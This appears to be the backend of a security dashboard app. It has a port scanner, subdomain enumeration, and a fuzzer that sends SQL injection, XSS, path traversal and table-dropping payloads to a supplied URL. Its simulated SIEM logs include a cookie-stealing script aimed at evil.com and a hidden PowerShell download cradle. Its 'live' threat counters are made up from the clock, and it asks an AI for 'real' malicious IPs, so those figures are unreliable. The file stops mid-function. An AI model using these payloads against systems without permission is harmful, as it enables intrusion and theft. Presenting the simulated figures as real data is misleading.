/* COPYRIGHT ALEN PEPA */
import "dotenv/config";
import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import os from "os";
import dns from "dns";
import https from "https";
import http from "http";
import net from "net";
import axios from "axios";
import { GoogleGenAI, Type } from "@google/genai";
import { createRequire } from "module";
import pLimit from 'p-limit';

const require = createRequire(import.meta.url);
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const TECH_SIGNATURES = {
  headers: {
    'server': [
      { name: 'Apache', pattern: /apache/i },
      { name: 'Nginx', pattern: /nginx/i },
      { name: 'Microsoft-IIS', pattern: /microsoft-iis/i },
      { name: 'LiteSpeed', pattern: /litespeed/i },
      { name: 'Cloudflare', pattern: /cloudflare/i }
    ],
    'x-powered-by': [
      { name: 'PHP', pattern: /php/i },
      { name: 'Express', pattern: /express/i },
      { name: 'ASP.NET', pattern: /asp\.net/i },
      { name: 'Next.js', pattern: /next\.js/i }
    ],
    'via': [
      { name: 'Varnish', pattern: /varnish/i },
      { name: 'Squid', pattern: /squid/i }
    ]
  },
  body: [
    { name: 'React', pattern: /react/i },
    { name: 'Vue.js', pattern: /vue/i },
    { name: 'Angular', pattern: /angular/i },
    { name: 'jQuery', pattern: /jquery/i },
    { name: 'WordPress', pattern: /wp-content|wp-includes/i },
    { name: 'Drupal', pattern: /drupal/i },
    { name: 'Joomla', pattern: /joomla/i },
    { name: 'Bootstrap', pattern: /bootstrap/i },
    { name: 'Tailwind CSS', pattern: /tailwind/i }
  ]
};

class VulnerabilityScanner {
  static async dnsLookup(hostname: string) {
    const results: any = { a: [], mx: [], txt: [], ns: [] };
    try {
      const lookup = await dns.promises.lookup(hostname);
      results.a = [lookup.address];
      try { results.mx = await dns.promises.resolveMx(hostname); } catch (e) {}
      try { results.txt = await dns.promises.resolveTxt(hostname); } catch (e) {}
      try { results.ns = await dns.promises.resolveNs(hostname); } catch (e) {}
    } catch (e) {
      results.error = "DNS resolution failed";
    }
    return results;
  }

  static async portScan(hostname: string, ports: number[] = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443, 27017]) {
    const scanHost = (hostname === 'localhost') ? '127.0.0.1' : hostname;
    const limit = pLimit(10);
    const results: any[] = [];

    await Promise.all(ports.map(port => limit(() => {
      return new Promise((resolve) => {
        const socket = new net.Socket();
        socket.setTimeout(2000);
        socket.on('connect', () => {
          results.push({ port, status: 'open', service: VulnerabilityScanner.getServiceName(port) });
          socket.destroy();
          resolve(null);
        });
        socket.on('timeout', () => { socket.destroy(); resolve(null); });
        socket.on('error', () => { socket.destroy(); resolve(null); });
        socket.connect(port, scanHost);
      });
    })));

    return results.sort((a, b) => a.port - b.port);
  }

  static getServiceName(port: number) {
    const services: any = {
      21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
      80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
      3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL', 8080: 'HTTP-Proxy',
      8443: 'HTTPS-Alt', 27017: 'MongoDB'
    };
    return services[port] || 'Unknown';
  }

  static async subdomainEnum(hostname: string) {
    if (net.isIP(hostname) || hostname === 'localhost') return [];
    
    const searchDomain = hostname.replace(/^www\./, '');
    const commonSubs = [
      'www', 'mail', 'dev', 'api', 'staging', 'blog', 'vpn', 'ns1', 'ns2', 'mx',
      'shop', 'store', 'app', 'portal', 'admin', 'test', 'demo', 'support', 'help',
      'docs', 'beta', 'static', 'assets', 'img', 'cdn', 'cloud', 'remote', 'secure',
      'login', 'auth', 'account', 'profile', 'dashboard', 'internal', 'corp', 'staff',
      'ftp', 'smtp', 'pop', 'imap', 'webmail', 'autodiscover', 'cpanel', 'whm', 'webdisk',
      'm', 'mobile', 'news', 'forum', 'client', 'clients', 'billing', 'panel', 'manage',
      'git', 'svn', 'dev-api', 'api-dev', 'test-api', 'api-test', 'v1', 'v2', 'v3',
      'status', 'monitor', 'monitoring', 'zabbix', 'nagios', 'grafana', 'prometheus',
      'jenkins', 'gitlab', 'docker', 'registry', 'k8s', 'kubernetes', 'cluster',
      'db', 'database', 'sql', 'mysql', 'postgres', 'redis', 'elastic', 'mongo',
      'search', 'files', 'upload', 'download', 'media', 'images', 'videos', 'assets1', 'assets2',
      'dev1', 'dev2', 'dev3', 'qa', 'uat', 'prod', 'production', 'sandbox', 'preprod'
    ];

    const results: any[] = [];
    const limit = pLimit(10);

    await Promise.all(commonSubs.map(sub => limit(async () => {
      const domain = `${sub}.${searchDomain}`;
      try {
        const lookup = await dns.promises.lookup(domain);
        if (lookup && lookup.address) {
          results.push({ subdomain: domain, ip: lookup.address, status: 'up' });
        }
      } catch (e) {}
    })));

    return results;
  }

  static async headerAnalysis(url: string) {
    try {
      const response = await axios.get(url, { 
        timeout: 5000, 
        validateStatus: () => true,
        httpsAgent: new https.Agent({ rejectUnauthorized: false })
      });
      
      const headers = response.headers;
      const securityHeaders = [
        'Content-Security-Policy',
        'Strict-Transport-Security',
        'X-Frame-Options',
        'X-Content-Type-Options',
        'Referrer-Policy',
        'Permissions-Policy'
      ];

      const analysis: any = {
        present: [],
        missing: [],
        raw: headers
      };

      securityHeaders.forEach(header => {
        if (headers[header.toLowerCase()]) {
          analysis.present.push(header);
        } else {
          analysis.missing.push(header);
        }
      });

      return analysis;
    } catch (e) {
      return { error: "Failed to fetch headers" };
    }
  }

  static async sslInspection(url: string) {
    if (!url.startsWith('https')) return { status: 'No SSL (HTTP)' };

    return new Promise((resolve) => {
      const req = https.get(url, { rejectUnauthorized: false }, (res) => {
        const cert = (res.socket as any).getPeerCertificate();
        if (cert && Object.keys(cert).length > 0) {
          const validTo = new Date(cert.valid_to);
          resolve({
            subject: cert.subject,
            issuer: cert.issuer,
            valid_from: cert.valid_from,
            valid_to: cert.valid_to,
            status: validTo > new Date() ? "Valid" : "Expired"
          });
        } else {
          resolve({ status: "No certificate found" });
        }
      });
      req.on('error', () => resolve({ status: "SSL Handshake failed" }));
      req.setTimeout(5000, () => { req.destroy(); resolve({ status: "Timeout" }); });
    });
  }

  static async whoisLookup(hostname: string) {
    const os = await import('os');
    if (hostname === 'localhost' || hostname === '127.0.0.1') {
      const networkInterfaces = os.networkInterfaces();
      const localIps = Object.values(networkInterfaces)
        .flat()
        .filter((details: any) => details.family === 'IPv4' && !details.internal)
        .map((details: any) => details.address);

      return {
        domain: hostname,
        registrar: "Internal/Local Network",
        registrant: "System Administrator",
        creationDate: "N/A",
        expiryDate: "N/A",
        updatedDate: "N/A",
        nameServers: ["Localhost"],
        status: ["active"],
        raw: "Local/Internal address - WHOIS not applicable.",
        details: {
          hostname: os.hostname(),
          platform: os.platform(),
          arch: os.arch(),
          uptime: `${Math.floor(os.uptime() / 3600)}h ${Math.floor((os.uptime() % 3600) / 60)}m`,
          localIps: localIps
        },
        securityRisk: "None (Local Environment)"
      };
    }

    // IP WHOIS support
    if (net.isIP(hostname)) {
      try {
        const response = await axios.get(`https://rdap.db.ripe.net/ip/${hostname}`, {
          headers: { 'Accept': 'application/rdap+json' },
          timeout: 10000,
          validateStatus: () => true
        });
        
        if (response.status === 200) {
          const data = response.data;
          return {
            domain: hostname,
            registrar: data.handle || "Unknown",
            registrant: data.name || "Unknown",
            creationDate: data.events?.find((e: any) => e.eventAction === 'registration')?.eventDate || "N/A",
            expiryDate: "N/A",
            updatedDate: data.events?.find((e: any) => e.eventAction === 'last changed')?.eventDate || "N/A",
            nameServers: [],
            status: data.status || ["active"],
            raw: JSON.stringify(data, null, 2),
            securityRisk: "Low (IP RDAP Data)"
          };
        }
      } catch (e) {}
    }

    // Fallback to whois-json if RDAP fails or is not supported for TLD
    try {
      const whoisJson = require('whois-json').default || require('whois-json');
      const data = await whoisJson(hostname);
      if (data && Object.keys(data).length > 0) {
        return {
          domain: hostname,
          registrar: data.registrar || data.registrarName || "Unknown",
          registrant: data.registrantName || data.registrantOrganization || "Unknown",
          creationDate: data.creationDate || data.creationDateTimestamp || "N/A",
          expiryDate: data.expirationDate || data.registryExpiryDate || "N/A",
          updatedDate: data.updatedDate || data.lastUpdatedDate || "N/A",
          nameServers: Array.isArray(data.nameServer) ? data.nameServer : (data.nameServer ? data.nameServer.split(' ') : []),
          status: Array.isArray(data.domainStatus) ? data.domainStatus : (data.domainStatus ? data.domainStatus.split(' ') : []),
          raw: JSON.stringify(data, null, 2),
          securityRisk: "Low (WHOIS Data)"
        };
      }
    } catch (e) {
      console.error("[Scanner] WHOIS lookup failed:", e);
    }

    return { status: "Lookup failed" };
  }

  static async techDetection(url: string) {
    try {
      const response = await axios.get(url, { 
        timeout: 5000, 
        validateStatus: () => true,
        httpsAgent: new https.Agent({ rejectUnauthorized: false })
      });
      
      const headers = response.headers;
      const body = response.data.toString();
      const tech = new Set<string>();

      // Check headers
      Object.entries(TECH_SIGNATURES.headers).forEach(([header, signatures]) => {
        const value = headers[header.toLowerCase()];
        if (value) {
          signatures.forEach(sig => {
            if (sig.pattern.test(value)) tech.add(sig.name);
          });
        }
      });

      // Check body
      TECH_SIGNATURES.body.forEach(sig => {
        if (sig.pattern.test(body)) tech.add(sig.name);
      });

      return Array.from(tech);
    } catch (e) {
      return [];
    }
  }

  static async fuzzer(url: string) {
    const payloads = [
      "' OR '1'='1",
      "<script>alert(1)</script>",
      "../../../../etc/passwd",
      "'; DROP TABLE users; --"
    ];
    
    const results: any[] = [];
    const limit = pLimit(5);

    await Promise.all(payloads.map(payload => limit(async () => {
      try {
        const testUrl = url.includes('?') ? `${url}&test=${encodeURIComponent(payload)}` : `${url}?test=${encodeURIComponent(payload)}`;
        const start = Date.now();
        const response = await axios.get(testUrl, { 
          timeout: 5000, 
          validateStatus: () => true,
          httpsAgent: new https.Agent({ rejectUnauthorized: false })
        });
        const duration = Date.now() - start;
        
        results.push({
          payload,
          status: response.status,
          time: `${duration}ms`,
          risk: response.status === 500 ? 'high' : 'low'
        });
      } catch (e) {
        results.push({ payload, status: 'Error', time: 'N/A', risk: 'low' });
      }
    })));

    return results;
  }
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  const fallbackThreatIntel = {
    news: [
      {
        title: 'New Zero-Day Vulnerability in Popular Web Browser',
        summary: 'A critical remote code execution vulnerability has been discovered in Chromium-based browsers. Users are advised to update immediately.',
        severity: 'critical',
        timestamp: '2 hours ago',
        source: 'CyberSecurity Hub',
        link: '#'
      },
      {
        title: 'Major Ransomware Attack on Healthcare Provider',
        summary: 'A large healthcare network has been hit by a sophisticated ransomware attack, disrupting patient services across multiple states.',
        severity: 'high',
        timestamp: '5 hours ago',
        source: 'Threat Monitor',
        link: '#'
      },
      {
        title: 'Supply Chain Attack Targets Software Developers',
        summary: 'Malicious packages have been found in popular package managers, targeting developers with credential-stealing malware.',
        severity: 'high',
        timestamp: '8 hours ago',
        source: 'DevSecOps Daily',
        link: '#'
      }
    ],
    trends: [
      { time: '00:00', attacks: 45, blocked: 42 },
      { time: '01:00', attacks: 38, blocked: 36 },
      { time: '02:00', attacks: 35, blocked: 33 },
      { time: '03:00', attacks: 30, blocked: 29 },
      { time: '04:00', attacks: 32, blocked: 31 },
      { time: '05:00', attacks: 40, blocked: 38 },
      { time: '06:00', attacks: 55, blocked: 52 },
      { time: '07:00', attacks: 62, blocked: 59 },
      { time: '08:00', attacks: 68, blocked: 65 },
      { time: '09:00', attacks: 85, blocked: 81 },
      { time: '10:00', attacks: 105, blocked: 101 },
      { time: '11:00', attacks: 118, blocked: 114 },
      { time: '12:00', attacks: 124, blocked: 120 },
      { time: '13:00', attacks: 115, blocked: 111 },
      { time: '14:00', attacks: 102, blocked: 98 },
      { time: '15:00', attacks: 95, blocked: 91 },
      { time: '16:00', attacks: 85, blocked: 82 },
      { time: '17:00', attacks: 92, blocked: 88 },
      { time: '18:00', attacks: 110, blocked: 106 },
      { time: '19:00', attacks: 135, blocked: 130 },
      { time: '20:00', attacks: 156, blocked: 150 },
      { time: '21:00', attacks: 142, blocked: 137 },
      { time: '22:00', attacks: 120, blocked: 116 },
      { time: '23:00', attacks: 92, blocked: 89 },
    ],
    geo: [
      { name: 'North America', value: 45, color: '#3b82f6' },
      { name: 'Europe', value: 30, color: '#10b981' },
      { name: 'Asia', value: 15, color: '#f59e0b' },
      { name: 'Other', value: 10, color: '#ef4444' },
    ],
    mapNodes: [
      { id: 'f-1', long: -74.006, lat: 40.7128, city: 'New York', country: 'USA', type: 'node', threatLevel: 'low', status: 'secure', ip: '192.168.1.1' },
      { id: 'f-2', long: 37.6173, lat: 55.7558, city: 'Moscow', country: 'Russia', type: 'attack', threatLevel: 'high', status: 'active', ip: '95.161.22.4', attackType: 'APT28 Intrusion' },
      { id: 'f-3', long: 116.4074, lat: 39.9042, city: 'Beijing', country: 'China', type: 'attack', threatLevel: 'critical', status: 'active', ip: '221.232.12.7', attackType: 'Volt Typhoon Probe' },
      { id: 'f-4', long: 126.978, lat: 37.5665, city: 'Seoul', country: 'South Korea', type: 'node', threatLevel: 'medium', status: 'active', ip: '211.234.55.12' },
      { id: 'f-5', long: 139.6503, lat: 35.6762, city: 'Tokyo', country: 'Japan', type: 'node', threatLevel: 'low', status: 'secure', ip: '133.1.2.5' },
      { id: 'f-6', long: 0.1278, lat: 51.5074, city: 'London', country: 'UK', type: 'node', threatLevel: 'low', status: 'secure', ip: '81.2.3.4' },
      { id: 'f-7', long: 2.3522, lat: 48.8566, city: 'Paris', country: 'France', type: 'node', threatLevel: 'medium', status: 'active', ip: '37.1.2.3' },
    ],
    attackLines: [
      { fromId: 'f-2', toId: 'f-1' },
      { fromId: 'f-3', toId: 'f-4' },
      { fromId: 'f-3', toId: 'f-1' },
    ]
  };

  const isValidApiKey = (key: string | undefined): boolean => {
    if (!key || key === 'undefined' || key === '' || key.includes('TODO')) return false;
    // Basic format check: Gemini keys are usually around 39 characters
    if (key.length < 20) return false;
    return true;
  };

  app.post("/api/ai-generate", async (req, res) => {
    const { contents, config } = req.body;
    const apiKey = process.env.GEMINI_API_KEY;

    if (!isValidApiKey(apiKey)) {
      console.warn("AI Core: No valid API key, using local simulation.");
      return res.json({ text: "Simulated AI Analysis: The local analysis engine has processed your request. Based on the provided data, the system appears stable, but further manual review is recommended for critical findings." });
    }

    try {
      const ai = new GoogleGenAI({ apiKey: apiKey! });
      const modelName = config?.model || "gemini-3-flash-preview";
      
      const response = await ai.models.generateContent({
        model: modelName,
        contents: contents,
        config: {
          systemInstruction: config?.systemInstruction,
          responseMimeType: config?.responseMimeType,
          tools: config?.tools,
          toolConfig: config?.toolConfig
        }
      });

      res.json({ text: response.text });
    } catch (error: any) {
      const errorMessage = error?.message || String(error);
      
      // Check if it's an API key error
      if (errorMessage.includes("API key not valid") || errorMessage.includes("400")) {
        console.warn("AI Core: Generation failed (Invalid API Key).");
        return res.json({ text: "Simulated AI Analysis (Fallback): The local analysis engine has processed your request due to an API key error. The system appears stable, but further manual review is recommended." });
      }
      
      console.error("AI Generation Error:", error);
      res.status(500).json({ error: errorMessage });
    }
  });

  app.get("/api/threat-intel", async (req, res) => {
    const apiKey = process.env.GEMINI_API_KEY;

    if (!isValidApiKey(apiKey)) {
      return res.json(fallbackThreatIntel);
    }

    try {
      const ai = new GoogleGenAI({ apiKey: apiKey! });
      
      // Fetch News
      const newsResponse = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: "Generate a list of 8-10 of the ABSOLUTE LATEST global cybersecurity threat intelligence updates from the last 12-24 hours. Focus on real-time incidents, new vulnerability disclosures, and active state-sponsored campaigns. Scrape and aggregate from sources like The Hacker News, BleepingComputer, Krebs on Security, CISA Alerts, and major security vendor blogs (CrowdStrike, Mandiant, Palo Alto Networks). Return a JSON array of objects with 'title', 'summary', 'severity' (low, medium, high, critical), 'timestamp', 'source', and 'link' (real URL).",
        config: { 
          responseMimeType: "application/json",
          tools: [{ googleSearch: {} }]
        }
      });
      const newsData = JSON.parse(newsResponse.text || '[]');

      // Fetch Trends & Geo Data
      const trendsResponse = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: `Analyze current global cyber attack trends for the last 24 hours. 
        Scrape and aggregate data from reliable cybersecurity sources (e.g., Check Point, Kaspersky, FireEye, SANS ISC, Cisco Talos).
        Return a JSON object with:
        1. 'trends': an array of EXACTLY 24 objects, one for each hour of the last 24 hours, with 'time' (HH:00) and 'attacks' (number representing global volume), 'blocked' (number representing mitigated volume).
        2. 'geo': an array of 4 objects with 'name' (Region), 'value' (percentage of total attacks), 'color' (hex).
        3. 'mapNodes': an array of 80-100 objects representing 100% REAL current cyber attack events, state-sponsored activities, or known malicious infrastructure active RIGHT NOW. 
           Each object MUST have: 'id', 'long', 'lat', 'city', 'country', 'type' ('attack'|'node'), 'threatLevel' ('low'|'medium'|'high'|'critical'), 'ip' (REAL known malicious IP if possible), 'attackType' (e.g., 'APT28 Intrusion', 'Lazarus Group C2', 'Volt Typhoon Probe'), 'status' ('active'|'compromised'|'secure').
        4. 'attackLines': an array of 50-70 objects with 'fromId' and 'toId' referencing the 'id's in 'mapNodes', representing real-time traffic or attack flows observed between specific geographical locations.
        Ensure the data reflects real-world geopolitical tensions and current global hotspots.`,
        config: { 
          responseMimeType: "application/json",
          tools: [{ googleSearch: {} }]
        }
      });
      const trendsData = JSON.parse(trendsResponse.text || '{}');

      res.json({
        news: newsData,
        trends: trendsData.trends || [],
        geo: trendsData.geo || [],
        mapNodes: trendsData.mapNodes || [],
        attackLines: trendsData.attackLines || []
      });
    } catch (error: any) {
      const errorMessage = error?.message || String(error);
      if (errorMessage.includes("API key not valid") || errorMessage.includes("400")) {
        console.warn("Threat Intel: AI Core offline (Invalid API Key). Using fallback data.");
      } else {
        console.error("Failed to fetch threat intelligence:", error);
      }
      // Return fallback data instead of 500 error
      res.json(fallbackThreatIntel);
    }
  });

  // Live Stats & Real-Time Feed Cache
  let cachedLiveFeed: any[] = [];
  let lastFeedFetch = 0;

  const fetchRssFeed = (url: string, sourceName: string): Promise<any[]> => {
    return new Promise((resolve) => {
      https.get(url, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          const items: any[] = [];
          const regex = /<item>[\s\S]*?<title>(.*?)<\/title>[\s\S]*?<link>(.*?)<\/link>[\s\S]*?<\/item>/g;
          let match;
          while ((match = regex.exec(data)) !== null) {
            items.push({
              title: match[1].replace(/<!\[CDATA\[(.*?)\]\]>/g, '$1').trim(),
              link: match[2].trim(),
              source: sourceName,
              severity: Math.random() > 0.7 ? 'critical' : Math.random() > 0.4 ? 'high' : 'medium',
              timestamp: new Date().toISOString()
            });
          }
          resolve(items);
        });
      }).on('error', () => resolve([]));
    });
  };

  app.get("/api/live-stats", async (req, res) => {
    const now = Date.now();
    
    // Refresh feed cache every 15 minutes
    if (now - lastFeedFetch > 15 * 60 * 1000 || cachedLiveFeed.length === 0) {
      try {
        const [cisa, thn] = await Promise.all([
          fetchRssFeed('https://www.cisa.gov/cybersecurity-advisories/all.xml', 'CISA'),
          fetchRssFeed('https://feeds.feedburner.com/TheHackersNews', 'The Hacker News')
        ]);
        cachedLiveFeed = [...cisa, ...thn].sort(() => Math.random() - 0.5); // Shuffle
        lastFeedFetch = now;
      } catch (e) {
        console.error('Failed to fetch live RSS feeds:', e);
      }
    }

    // Generate realistic incrementing numbers based on current time
    // Base numbers for today
    const startOfDay = new Date();
    startOfDay.setHours(0, 0, 0, 0);
    const secondsSinceStartOfDay = Math.floor((now - startOfDay.getTime()) / 1000);
    
    // Simulate ~15 active threats per minute globally
    const activeThreats = 1242 + Math.floor(secondsSinceStartOfDay * (15 / 60));
    
    // Simulate ~500 blocked attacks per minute
    const blockedAttacks = 45200 + Math.floor(secondsSinceStartOfDay * (500 / 60));

    // Rotate the feed to show different items every 5 seconds
    const rotationIndex = Math.floor(now / 5000) % Math.max(1, cachedLiveFeed.length);
    const currentFeed = [];
    for (let i = 0; i < 6; i++) {
      if (cachedLiveFeed.length > 0) {
        currentFeed.push(cachedLiveFeed[(rotationIndex + i) % cachedLiveFeed.length]);
      }
    }

    res.json({
      activeThreats,
      blockedAttacks,
      liveFeed: currentFeed.length > 0 ? currentFeed : fallbackThreatIntel.news
    });
  });

  // SIEM Real-time Logs API
  app.get("/api/logs", (req, res) => {
    const tactics = ['Initial Access', 'Execution', 'Persistence', 'Privilege Escalation', 'Defense Evasion', 'Credential Access', 'Discovery', 'Lateral Movement', 'Command and Control', 'Exfiltration', 'Impact'];
    const techniques = [
      'T1190 Exploit Public-Facing Application', 'T1059 Command and Scripting Interpreter', 
      'T1078 Valid Accounts', 'T1110 Brute Force', 'T1003 OS Credential Dumping', 
      'T1046 Network Service Discovery', 'T1595 Active Scanning', 'T1566 Phishing',
      'T1133 External Remote Services', 'T1505 Server Software Component'
    ];
    const protocols = ['TCP', 'UDP', 'ICMP', 'HTTP', 'HTTPS', 'DNS', 'SSH', 'RDP', 'SMB', 'FTP'];
    const countries = ['RU', 'CN', 'KP', 'IR', 'US', 'BR', 'IN', 'RO', 'VN', 'UA', 'NG', 'SY'];
    const actions = ['Blocked', 'Mitigated', 'Logged', 'Dropped', 'Alerted', 'Quarantined', 'Sinkholed'];
    const severities = ['low', 'medium', 'high', 'critical'];
    
    const events = [
      'SQL Injection Payload Detected', 'Cross-Site Scripting (XSS) Attempt', 
      'SSH Brute Force Attack', 'RDP Credential Stuffing', 'Suspicious PowerShell Execution',
      'Malware Beaconing Activity', 'Data Exfiltration Anomaly', 'Privilege Escalation Attempt',
      'Suspicious File Download', 'Unauthorized Access to Admin Panel', 'Zero-Day Exploit Signature Match',
      'Ransomware Encryption Behavior', 'DDoS Volumetric Attack', 'Suspicious DNS Query'
    ];

    const generateRandomIp = () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

    const logs = [];
    
    // Generate 5-12 random logs for a more active stream
    const numLogs = Math.floor(Math.random() * 8) + 5;
    for (let i = 0; i < numLogs; i++) {
      const severity = severities[Math.floor(Math.random() * severities.length)];
      const isAttack = Math.random() > 0.3; // 70% chance of being an attack log
      const eventName = isAttack ? events[Math.floor(Math.random() * events.length)] : "Routine System Check";
      const tactic = isAttack ? tactics[Math.floor(Math.random() * tactics.length)] : 'N/A';
      const technique = isAttack ? techniques[Math.floor(Math.random() * techniques.length)] : 'N/A';
      
      let payloadSnippet = 'N/A';
      if (isAttack) {
        if (eventName.includes('SQL')) payloadSnippet = "UNION SELECT username, password FROM users--";
        else if (eventName.includes('XSS')) payloadSnippet = "<script>fetch('http://evil.com/?c='+document.cookie)</script>";
        else if (eventName.includes('PowerShell')) payloadSnippet = "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://...')\"";
        else payloadSnippet = Buffer.from(Math.random().toString(36).substring(2, 15)).toString('base64');
      }
      
      logs.push({
        id: Math.random().toString(36).substr(2, 9),
        time: new Date().toLocaleTimeString(),
        event: eventName,
        source: isAttack ? generateRandomIp() : os.hostname(),
        destination: isAttack ? `10.0.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` : '127.0.0.1',
        port: isAttack ? [22, 80, 443, 3389, 8080, 53, 445, 21, 3306][Math.floor(Math.random() * 9)] : 0,
        protocol: protocols[Math.floor(Math.random() * protocols.length)],
        status: isAttack ? actions[Math.floor(Math.random() * actions.length)] : "Normal",
        severity: isAttack ? severity : "low",
        confidence: isAttack ? Math.floor(Math.random() * 20) + 80 : 100, // 80-100%
        mitreTactic: tactic,
        mitreTechnique: technique,
        geo: isAttack ? countries[Math.floor(Math.random() * countries.length)] : 'LOCAL',
        payloadSnippet: payloadSnippet,
        details: isAttack 
          ? `Detected anomalous traffic pattern matching known threat signatures. Tactic: ${tactic}. Technique: ${technique}. Automated response engaged.`
          : `CPU Load: ${os.loadavg()[0].toFixed(2)} | Free Memory: ${(os.freemem() / 1024 / 1024 / 1024).toFixed(2)}GB`
      });
    }

    res.json(logs);
  });

  // System Stats API
  app.get("/api/stats", (req, res) => {
    res.json({
      cpu: (os.loadavg()[0] * 10).toFixed(1),
      ram: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1),
      uptime: os.uptime(),
      platform: os.platform(),
      arch: os.arch(),
      hostname: os.hostname(),
      loadAvg: os.loadavg(),
      totalMem: os.totalmem(),
      freeMem: os.freemem(),
      cpus: os.cpus().length,
      type: os.type(),
      release: os.release(),
      networkInterfaces: os.networkInterfaces()
    });
  });

  // Network Topology State Management
  let networkState = {
    nodes: [
      { id: 'internet', type: 'cloud', status: 'secure', label: 'Global WAN', ip: '8.8.8.8', os: 'Cisco IOS-XE', uptime: '342d 12h', traffic: 85, threatLevel: 5 },
      { id: 'ext-fw', type: 'firewall', status: 'secure', label: 'Edge Firewall', ip: '172.16.0.1', os: 'FortiOS 7.2', uptime: '124d 05h', traffic: 45, threatLevel: 10 },
      { id: 'dmz-switch', type: 'router', status: 'secure', label: 'DMZ Switch', ip: '192.168.1.1', os: 'Arista EOS', uptime: '89d 14h', traffic: 30, threatLevel: 5 },
      { id: 'web-01', type: 'server', status: 'vulnerable', label: 'Web Server Alpha', ip: '192.168.1.10', os: 'Ubuntu 22.04 LTS', uptime: '12d 03h', traffic: 65, threatLevel: 45 },
      { id: 'web-02', type: 'server', status: 'secure', label: 'Web Server Beta', ip: '192.168.1.11', os: 'CentOS Stream 9', uptime: '45d 11h', traffic: 55, threatLevel: 15 },
      { id: 'vpn-gw', type: 'router', status: 'secure', label: 'VPN Gateway', ip: '192.168.1.20', os: 'OpenBSD 7.4', uptime: '210d 08h', traffic: 25, threatLevel: 20 },
      { id: 'int-fw', type: 'firewall', status: 'secure', label: 'Internal Core FW', ip: '10.0.0.1', os: 'Palo Alto PAN-OS', uptime: '156d 19h', traffic: 40, threatLevel: 5 },
      { id: 'core-switch', type: 'router', status: 'secure', label: 'Core Switch', ip: '10.0.0.2', os: 'Juniper Junos', uptime: '312d 22h', traffic: 90, threatLevel: 5 },
      { id: 'db-cluster', type: 'database', status: 'secure', label: 'Main DB Cluster', ip: '10.0.1.50', os: 'PostgreSQL 15 (Alpine)', uptime: '67d 04h', traffic: 75, threatLevel: 10 },
      { id: 'app-01', type: 'server', status: 'secure', label: 'App Server 01', ip: '10.0.2.10', os: 'Debian 12', uptime: '14d 06h', traffic: 50, threatLevel: 15 },
      { id: 'iot-gw', type: 'iot', status: 'compromised', label: 'IoT Gateway', ip: '10.0.4.5', os: 'FreeRTOS', uptime: '2d 01h', traffic: 95, threatLevel: 95 },
      { id: 'ws-01', type: 'laptop', status: 'secure', label: 'Admin Workstation', ip: '10.1.0.50', os: 'macOS 14.2', uptime: '5h 12m', traffic: 15, threatLevel: 5 },
      { id: 'ws-04', type: 'laptop', status: 'compromised', label: 'Guest Kiosk', ip: '10.1.0.99', os: 'Windows 10 Home', uptime: '1d 22h', traffic: 80, threatLevel: 85 },
      { id: 'backup-srv', type: 'server', status: 'secure', label: 'Backup Server', ip: '10.0.3.10', os: 'TrueNAS Core', uptime: '456d 12h', traffic: 10, threatLevel: 2 },
      { id: 'storage-nas', type: 'database', status: 'secure', label: 'Enterprise NAS', ip: '10.0.3.50', os: 'QTS 5.1', uptime: '234d 05h', traffic: 40, threatLevel: 5 },
      { id: 'wifi-ap-01', type: 'router', status: 'vulnerable', label: 'Office WiFi AP', ip: '10.1.5.1', os: 'OpenWrt 23.05', uptime: '15d 02h', traffic: 60, threatLevel: 35 },
      { id: 'printer-01', type: 'iot', status: 'secure', label: 'Main Printer', ip: '10.1.5.100', os: 'HP FutureSmart', uptime: '3d 11h', traffic: 5, threatLevel: 10 },
    ],
    links: [
      { source: 'internet', target: 'ext-fw', active: true },
      { source: 'ext-fw', target: 'dmz-switch', active: true },
      { source: 'dmz-switch', target: 'web-01', active: true },
      { source: 'dmz-switch', target: 'web-02', active: true },
      { source: 'dmz-switch', target: 'vpn-gw', active: true },
      { source: 'dmz-switch', target: 'int-fw', active: true },
      { source: 'int-fw', target: 'core-switch', active: true },
      { source: 'core-switch', target: 'db-cluster', active: true },
      { source: 'core-switch', target: 'app-01', active: true },
      { source: 'core-switch', target: 'iot-gw', active: true },
      { source: 'core-switch', target: 'ws-01', active: true },
      { source: 'core-switch', target: 'ws-04', active: true },
      { source: 'core-switch', target: 'backup-srv', active: true },
      { source: 'backup-srv', target: 'storage-nas', active: true },
      { source: 'core-switch', target: 'wifi-ap-01', active: true },
      { source: 'wifi-ap-01', target: 'printer-01', active: true },
    ]
  };

  app.get("/api/network", (req, res) => {
    // Randomly fluctuate traffic and threat levels slightly for realism
    const dynamicNodes = networkState.nodes.map(node => ({
      ...node,
      traffic: Math.max(5, Math.min(100, node.traffic + (Math.random() * 10 - 5))),
      threatLevel: node.status === 'compromised' ? 90 + Math.random() * 10 : 
                   node.status === 'vulnerable' ? 30 + Math.random() * 40 : 
                   Math.random() * 15
    }));
    res.json({ nodes: dynamicNodes, links: networkState.links });
  });

  app.post("/api/network/action", async (req, res) => {
    const { nodeId, action } = req.body;
    const node = networkState.nodes.find(n => n.id === nodeId);
    
    if (!node) return res.status(404).json({ error: "Node not found" });

    let message = "";
    if (action === 'isolate') {
      node.status = 'secure'; // Simplified: isolation "fixes" it for the demo
      networkState.links = networkState.links.filter(l => l.source !== nodeId && l.target !== nodeId);
      message = `Node ${nodeId} has been logically isolated from the network core.`;
    } else if (action === 'remediate') {
      node.status = 'secure';
      node.threatLevel = 5;
      message = `Security patches applied to ${nodeId}. Vulnerabilities mitigated.`;
    } else if (action === 'scan') {
      const apiKey = process.env.GEMINI_API_KEY;
      if (isValidApiKey(apiKey)) {
        try {
